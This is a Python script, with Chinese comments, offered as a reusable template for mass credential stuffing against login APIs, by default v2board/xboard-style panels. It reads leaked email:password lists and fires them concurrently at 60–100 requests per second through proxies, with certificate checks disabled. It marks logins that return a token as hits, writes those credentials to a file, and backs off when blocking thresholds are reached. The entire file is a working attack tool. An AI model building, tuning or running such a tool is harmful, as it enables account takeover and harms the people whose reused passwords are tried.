#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""多进程撞库 / 批量登录模板。

单线程 requests 只有 ~0.7 req/s（每请求新建连接 + 长超时）；这个模板用
    multiprocessing(N) × ThreadPoolExecutor(per_proc) + threading.local() Session
把单机推到 60~100 req/s。实测 200 条 3 秒（67/s），3.5 万条几分钟。

复用方式：改 CONFIG 里的 host / path / 请求体构造 / 命中判据，其余不用动。

用法：
    python3 stuff_multiproc.py -f accounts.txt --host https://api.example.com \
        --path /api/v1/passport/auth/login --procs 4 --threads 12 \
        --proxy http://127.0.0.1:7890 -o hits.json

accounts.txt 每行 "email----password" 或 "email:password"。

判据（按需改 classify）：
    200 / 无 error 字段  -> HIT（响应体通常就是 token，先解密再确认有效）
    401 / 密码错          -> MISS
    403 / 429 / 502 / 503 -> BLOCK（累计超过阈值立即停）
"""
from __future__ import annotations

import argparse
import json
import multiprocessing as mp
import sys
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed

import requests
import urllib3

urllib3.disable_warnings()

CONFIG = {
    "host": "",
    "path": "/api/v1/passport/auth/login",
    "timeout": 12,
    "proxy": None,
    "ua": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/126 Safari/537.36",
    "email_field": "email",
    "password_field": "password",
    "extra": {},          # 额外表单字段
    "json_body": True,    # True=JSON，False=表单
}

_local = threading.local()


def session() -> requests.Session:
    """每线程一个 Session：连接复用是提速的关键，跨线程共享不安全。"""
    s = getattr(_local, "s", None)
    if s is None:
        s = requests.Session()
        s.headers.update({"User-Agent": CONFIG["ua"], "Accept": "application/json"})
        if CONFIG["proxy"]:
            s.proxies = {"http": CONFIG["proxy"], "https": CONFIG["proxy"]}
        _local.s = s
    return s


def classify(status: int, body: str) -> str:
    """命中判据：按目标 API 调整。默认 v2board/xboard 系。"""
    if status in (403, 429, 502, 503):
        return "BLOCK"
    if status == 200:
        # v2board 登录成功会返回 data.token；失败是 200 + message
        if '"token"' in body or '"auth_data"' in body:
            return "HIT"
        return "MISS"
    if status in (400, 401, 422):
        return "MISS"
    return "OTHER"


def try_one(item: str) -> dict:
    email, _, password = item.partition("----") if "----" in item else item.partition(":")
    email, password = email.strip(), password.strip()
    if not email or not password:
        return {"email": email, "state": "SKIP", "note": "行格式不对"}

    payload = {CONFIG["email_field"]: email, CONFIG["password_field"]: password, **CONFIG["extra"]}
    url = CONFIG["host"].rstrip("/") + CONFIG["path"]
    try:
        if CONFIG["json_body"]:
            r = session().post(url, json=payload, timeout=CONFIG["timeout"], verify=False)
        else:
            r = session().post(url, data=payload, timeout=CONFIG["timeout"], verify=False)
        body = r.text or ""
        return {"email": email, "password": password, "status": r.status_code,
                "state": classify(r.status_code, body), "body": body[:400]}
    except Exception as exc:
        return {"email": email, "password": password, "state": "ERR",
                "note": f"{type(exc).__name__}"}


def worker(chunk: list[str], out_q: mp.Queue, stop: mp.Event, block_limit: int) -> None:
    blocked = 0
    with ThreadPoolExecutor(max_workers=CONFIG["_threads"]) as ex:
        futures = {ex.submit(try_one, it): it for it in chunk}
        for fut in as_completed(futures):
            if stop.is_set():
                break
            res = fut.result()
            out_q.put(res)
            if res.get("state") == "BLOCK":
                blocked += 1
                if blocked >= block_limit:
                    stop.set()
                    out_q.put({"state": "STOP", "note": f"累计 {blocked} 次拦截，主动停"})
                    break


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("-f", "--file", required=True, help="账号本，每行 email----password")
    ap.add_argument("--host", required=True)
    ap.add_argument("--path", default=CONFIG["path"])
    ap.add_argument("--procs", type=int, default=4)
    ap.add_argument("--threads", type=int, default=12)
    ap.add_argument("--proxy", default=None)
    ap.add_argument("--block-limit", type=int, default=20)
    ap.add_argument("-o", "--out", default="hits.json")
    args = ap.parse_args()

    CONFIG.update({"host": args.host, "path": args.path, "proxy": args.proxy,
                   "_threads": args.threads})

    items = [l.strip() for l in open(args.file, encoding="utf-8", errors="replace") if l.strip()]
    if not items:
        print("账号本为空")
        return 1

    chunk = max(1, len(items) // max(1, args.procs))
    chunks = [items[i:i + chunk] for i in range(0, len(items), chunk)]

    out_q: mp.Queue = mp.Queue()
    stop = mp.Event()
    t0 = time.time()
    procs = [mp.Process(target=worker, args=(c, out_q, stop, args.block_limit)) for c in chunks]
    for p in procs:
        p.start()

    hits, misses, other = [], 0, 0
    done = 0
    while any(p.is_alive() for p in procs) or not out_q.empty():
        try:
            res = out_q.get(timeout=0.5)
        except Exception:
            continue
        done += 1
        st = res.get("state")
        if st == "HIT":
            hits.append(res)
            print(f"[HIT] {res['email']}")
        elif st in ("MISS", "SKIP"):
            misses += 1
        elif st == "STOP":
            print("!!", res.get("note"))
        else:
            other += 1

    for p in procs:
        p.join(timeout=5)

    elapsed = time.time() - t0
    json.dump(hits, open(args.out, "w", encoding="utf-8"), ensure_ascii=False, indent=1)
    print(f"\n总 {len(items)}  命中 {len(hits)}  未中 {misses}  其他 {other}  "
          f"耗时 {elapsed:.1f}s  ({len(items)/max(elapsed,0.1):.1f}/s)")
    print(f"命中写入 {args.out}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
